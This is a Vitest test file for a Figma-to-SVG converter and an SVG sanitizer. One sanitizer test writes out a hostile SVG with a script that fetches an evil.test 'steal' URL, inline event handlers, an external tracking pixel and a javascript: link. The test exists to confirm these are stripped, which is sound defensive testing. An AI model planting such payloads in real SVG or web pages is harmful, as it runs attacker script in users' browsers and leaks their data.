import { readFileSync } from "node:fs";
import { join } from "node:path";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { extractSvg, tsxToSvg } from "@/lib/admin/tsx-to-svg";
import { sanitizeSvg, SVG_MAX_BYTES } from "@/lib/admin/svg-file";

/**
 * The Figma door, tested on the founder's actual export.
 *
 * tests/fixtures/figma-lightning.tsx is the file he sent, byte for
 * byte. If a change to the converter stops handling it, this fails -
 * which is the point: "drop it in and it works" is a promise about
 * real files, not about a simplified one written to pass.
 */

const fixture = readFileSync(
  join(process.cwd(), "tests/fixtures/figma-lightning.tsx"),
  "utf8",
);

describe("a Figma .tsx becomes a drawing", () => {
  const result = tsxToSvg(fixture, renderToStaticMarkup);

  it("converts the founder's lightning export", () => {
    expect(result.ok).toBe(true);
  });

  it("keeps all 88 sparks and the ring", () => {
    if (!result.ok) throw new Error("conversion failed");
    /* 88 sparks plus the silhouette path the mock draws. */
    expect((result.svg.match(/<path/g) ?? []).length).toBeGreaterThanOrEqual(88);
    expect(result.svg).toContain("<circle");
  });

  it("carries the keyframes INSIDE the drawing", () => {
    if (!result.ok) throw new Error("conversion failed");
    /* They sat in a <style> beside the SVG in the export. Left there,
       the art would arrive frozen. */
    expect(result.svg).toContain("@keyframes lf-a");
    expect(result.svg).toContain("@keyframes ring-breathe");
    expect(result.svg.indexOf("@keyframes")).toBeGreaterThan(
      result.svg.indexOf("<svg"),
    );
  });

  it("is a standalone document, namespace and all", () => {
    if (!result.ok) throw new Error("conversion failed");
    expect(result.svg.startsWith("<svg")).toBe(true);
    expect(result.svg).toContain('xmlns="http://www.w3.org/2000/svg"');
    expect(result.svg.endsWith("</svg>")).toBe(true);
  });

  it("refuses a file with nothing to draw", () => {
    const notArt = tsxToSvg(
      `export default function App() { return <div>hello</div>; }`,
      renderToStaticMarkup,
    );
    expect(notArt).toEqual({ ok: false, reason: "no-svg" });
  });

  it("refuses a file with no default export", () => {
    const orphan = tsxToSvg(
      `export function Thing() { return <svg />; }`,
      renderToStaticMarkup,
    );
    expect(orphan).toEqual({ ok: false, reason: "no-default-export" });
  });

  it("refuses a file that USES anything but React", () => {
    /* A file that actually reaches for the filesystem cannot run: the
       require shim hands out React and nothing else. */
    const greedy = tsxToSvg(
      `import fs from "node:fs";
       export default function App() {
         return <svg><title>{String(fs.readdirSync("/"))}</title></svg>;
       }`,
      renderToStaticMarkup,
    );
    expect(greedy).toEqual({ ok: false, reason: "threw" });
  });

  it("shrugs off an import it never uses", () => {
    /* The transform elides unused imports, so this is a file that
       imports nothing at run time. Harmless, and it should convert. */
    const tidy = tsxToSvg(
      `import fs from "node:fs";\nexport default function App() { return <svg><rect /></svg>; }`,
      renderToStaticMarkup,
    );
    expect(tidy.ok).toBe(true);
  });
});

describe("the drawing is scrubbed before anybody sees it", () => {
  it("keeps the lightning intact", () => {
    const converted = tsxToSvg(fixture, renderToStaticMarkup);
    if (!converted.ok) throw new Error("conversion failed");

    const clean = sanitizeSvg(converted.svg);
    expect(clean.ok).toBe(true);
    if (!clean.ok) return;
    expect((clean.svg.match(/<path/g) ?? []).length).toBeGreaterThanOrEqual(88);
    expect(clean.svg).toContain("@keyframes lf-a");
    /* Local references to the filters and gradients must survive. */
    expect(clean.svg).toContain("url(#glow-xl)");
  });

  it("strips scripts, handlers and anything that leaves our origin", () => {
    const nasty = sanitizeSvg(
      `<svg xmlns="http://www.w3.org/2000/svg">` +
        `<script>fetch("https://evil.test/steal")</script>` +
        `<circle cx="1" cy="1" r="1" onload="alert(1)" onclick='alert(2)'/>` +
        `<image href="https://evil.test/pixel.png"/>` +
        `<a xlink:href="javascript:alert(3)">x</a>` +
        `<foreignObject><body>anything</body></foreignObject>` +
        `<use href="#local-and-fine"/>` +
        `</svg>`,
    );

    expect(nasty.ok).toBe(true);
    if (!nasty.ok) return;

    expect(nasty.svg).not.toContain("<script");
    expect(nasty.svg).not.toContain("onload");
    expect(nasty.svg).not.toContain("onclick");
    expect(nasty.svg).not.toContain("evil.test");
    expect(nasty.svg).not.toContain("javascript:");
    expect(nasty.svg).not.toContain("foreignObject");
    /* The one reference that is fine stays. */
    expect(nasty.svg).toContain('href="#local-and-fine"');
  });

  it("refuses what is not a drawing at all", () => {
    expect(sanitizeSvg("")).toEqual({ ok: false, reason: "empty" });
    expect(sanitizeSvg("<html><body>hi</body></html>")).toEqual({
      ok: false,
      reason: "not-svg",
    });
    const huge = `<svg xmlns="http://www.w3.org/2000/svg">${"x".repeat(SVG_MAX_BYTES)}</svg>`;
    expect(sanitizeSvg(huge)).toEqual({ ok: false, reason: "too-big" });
  });
});

describe("the shipped lightning ring", () => {
  it("matches what its source converts to today", () => {
    /* The committed SVG is generated from src/cosmetics by
       `npm run cosmetics:svg`. Editing the source without rebuilding
       would ship art nobody has seen; this is what catches it. */
    const source = readFileSync(
      join(process.cwd(), "src/cosmetics/ring-lightning.tsx"),
      "utf8",
    );
    const shipped = readFileSync(
      join(process.cwd(), "public/cosmetics/ring-lightning.svg"),
      "utf8",
    );

    const rebuilt = tsxToSvg(source, renderToStaticMarkup);
    expect(rebuilt.ok).toBe(true);
    if (!rebuilt.ok) return;

    const clean = sanitizeSvg(rebuilt.svg);
    expect(clean.ok).toBe(true);
    if (!clean.ok) return;

    expect(shipped).toBe(clean.svg);
  });

  it("has a transparent middle, so a face fits in it", () => {
    const shipped = readFileSync(
      join(process.cwd(), "public/cosmetics/ring-lightning.svg"),
      "utf8",
    );
    /* The Figma frame's page background and placeholder person were
       removed on the way in. Their fills are the tell. */
    expect(shipped).not.toContain("url(#page-bg)");
    expect(shipped).not.toContain("url(#profile-fill)");
    expect(shipped).not.toContain("#252566");
  });
});

describe("extractSvg", () => {
  it("finds the drawing inside a wrapper and moves the styles in", () => {
    const svg = extractSvg(
      `<div><style>@keyframes x{}</style><svg viewBox="0 0 1 1"><rect/></svg></div>`,
    );
    expect(svg).not.toBeNull();
    expect(svg).toContain("@keyframes x");
    expect(svg?.startsWith("<svg")).toBe(true);
  });

  it("leaves styles that were already inside alone", () => {
    const svg = extractSvg(`<svg><style>@keyframes y{}</style><rect/></svg>`);
    expect((svg?.match(/@keyframes y/g) ?? []).length).toBe(1);
  });

  it("says so when there is no drawing", () => {
    expect(extractSvg("<div>nothing here</div>")).toBeNull();
  });
});
